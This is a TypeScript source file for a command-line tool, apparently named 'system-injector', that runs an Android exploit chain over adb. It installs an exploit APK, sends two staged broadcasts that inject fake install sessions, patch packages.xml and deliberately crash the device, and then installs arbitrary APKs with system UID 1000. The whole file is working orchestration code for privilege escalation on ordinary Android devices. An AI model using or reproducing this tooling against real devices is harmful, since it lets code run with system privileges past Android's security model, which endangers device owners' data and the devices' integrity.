import * as path from "node:path";
import * as fs from "node:fs";
import * as adb from "./adb.js";
import {
  INSTALLER_PACKAGE,
  EXPLOIT_PACKAGE,
  INSTALLER_ACTION,
  EXPLOIT_STAGE1_ACTION,
  EXPLOIT_STAGE2_ACTION,
  EXPLOIT_RECEIVER,
  INSTALLER_RECEIVER,
  DEVICE_TMP_DIR,
  POLL_INTERVAL_MS,
  POLL_TIMEOUT_MS,
  SYSTEM_READY_TIMEOUT_MS,
  SYSTEM_READY_POLL_MS,
  SYSTEM_READY_SETTLE_MS,
  INSTALLER_APK,
  EXPLOIT_APK,
} from "./constants.js";

/**
 * Check if the installer is already bootstrapped on the device.
 */
export async function isBootstrapped(): Promise<boolean> {
  return adb.isInstalled(INSTALLER_PACKAGE);
}

/**
 * Bootstrap the installer onto the device using the exploit.
 *
 * 1. adb install exploit.apk
 * 2. adb push installer.apk -> /data/local/tmp/
 * 3. Send STAGE1 broadcast (inject fake sessions + crash)
 * 4. Wait for device to come back
 * 5. Send STAGE2 broadcast (write APK + patch packages.xml + crash)
 * 6. Wait for device, poll for installer package, uninstall exploit
 */
export async function bootstrap(
  installerApk?: string,
  exploitApk?: string
): Promise<void> {
  const cliDir = path.dirname(new URL(import.meta.url).pathname);
  const resolvedInstallerApk = installerApk || path.resolve(cliDir, "..", INSTALLER_APK);
  const resolvedExploitApk = exploitApk || path.resolve(cliDir, "..", EXPLOIT_APK);

  // Verify APKs exist
  if (!fs.existsSync(resolvedInstallerApk)) {
    throw new Error(`Installer APK not found: ${resolvedInstallerApk}\nRun 'cd .. && ./gradlew :installer:assembleDebug' first.`);
  }
  if (!fs.existsSync(resolvedExploitApk)) {
    throw new Error(`Exploit APK not found: ${resolvedExploitApk}\nRun 'cd .. && ./gradlew :exploit:assembleDebug' first.`);
  }

  const deviceApkPath = `${DEVICE_TMP_DIR}/installer.apk`;

  console.log("[1/6] Installing exploit APK...");
  await adb.install(resolvedExploitApk);

  console.log("[2/6] Pushing installer APK to device...");
  await adb.push(resolvedInstallerApk, deviceApkPath);

  console.log("[3/6] Sending STAGE1 (inject sessions + crash)...");
  console.log("       Device will crash — this is expected.");
  await adb.broadcast(EXPLOIT_STAGE1_ACTION, { apk_path: deviceApkPath }, EXPLOIT_RECEIVER);

  console.log("[4/6] Waiting 20s for crash, then polling for system recovery...");
  await new Promise((resolve) => setTimeout(resolve, 20_000));
  await adb.waitForSystemReady(SYSTEM_READY_TIMEOUT_MS, SYSTEM_READY_POLL_MS, SYSTEM_READY_SETTLE_MS);

  console.log("[5/6] Sending STAGE2 (write APK + patch packages.xml + crash)...");
  console.log("       Device will crash again — this is expected.");
  await adb.broadcast(EXPLOIT_STAGE2_ACTION, { apk_path: deviceApkPath }, EXPLOIT_RECEIVER);

  console.log("[6/6] Waiting for installer to appear...");
  await adb.waitForSystemReady(SYSTEM_READY_TIMEOUT_MS, SYSTEM_READY_POLL_MS, SYSTEM_READY_SETTLE_MS);

  const found = await adb.pollForPackage(
    INSTALLER_PACKAGE,
    POLL_INTERVAL_MS,
    POLL_TIMEOUT_MS
  );

  if (!found) {
    throw new Error(
      `Timed out waiting for ${INSTALLER_PACKAGE} to appear. ` +
      `Check logcat for errors: adb logcat -s ExploitBootstrap Exploit`
    );
  }

  // Clean up exploit
  try {
    await adb.uninstall(EXPLOIT_PACKAGE);
  } catch {
    console.warn("Warning: failed to uninstall exploit package (may have been removed by reboot)");
  }

  console.log("Bootstrap complete! Installer is running as UID 1000.");
}

/**
 * Install an APK as a system UID app.
 *
 * Requires the installer to be bootstrapped first (via `bootstrap`).
 * Pushes the target APK and sends a broadcast to the installer.
 */
export async function installApk(apkPath: string): Promise<void> {
  const resolvedApk = path.resolve(apkPath);
  if (!fs.existsSync(resolvedApk)) {
    throw new Error(`APK not found: ${resolvedApk}`);
  }

  // Extract a reasonable filename for the device path
  const apkName = path.basename(resolvedApk);

  // Ensure installer is present — require explicit bootstrap for safety
  if (!(await isBootstrapped())) {
    throw new Error(
      `Installer not bootstrapped. Run 'system-injector bootstrap' first.\n` +
      `Auto-bootstrap from 'install' is disabled for safety — the exploit ` +
      `chain should only be triggered intentionally.`
    );
  }

  const deviceApkPath = `${DEVICE_TMP_DIR}/${apkName}`;

  console.log(`[1/3] Pushing ${apkName} to device...`);
  await adb.push(resolvedApk, deviceApkPath);

  console.log("[2/3] Triggering system install...");
  console.log("       (device will crash once — this is expected)");
  await adb.broadcast(INSTALLER_ACTION, { apk_path: deviceApkPath }, INSTALLER_RECEIVER);

  console.log("[3/3] Waiting for system to come back...");
  await adb.waitForSystemReady(SYSTEM_READY_TIMEOUT_MS, SYSTEM_READY_POLL_MS, SYSTEM_READY_SETTLE_MS);

  console.log("Install complete! The app is now running as system UID (1000).");
  console.log("Check with: adb shell pm list packages | grep <package-name>");
}

/**
 * Print status of the system injector.
 */
export async function status(): Promise<void> {
  const installerPresent = await adb.isInstalled(INSTALLER_PACKAGE);
  const exploitPresent = await adb.isInstalled(EXPLOIT_PACKAGE);

  console.log(`Installer (${INSTALLER_PACKAGE}): ${installerPresent ? "INSTALLED" : "not installed"}`);
  console.log(`Exploit   (${EXPLOIT_PACKAGE}): ${exploitPresent ? "INSTALLED (should be cleaned up)" : "not installed"}`);

  if (installerPresent) {
    console.log("\nReady to install APKs as system UID.");
    console.log("Usage: system-injector install <apk-path>");
  } else {
    console.log("\nInstaller not bootstrapped.");
    console.log("Usage: system-injector bootstrap");
  }
}
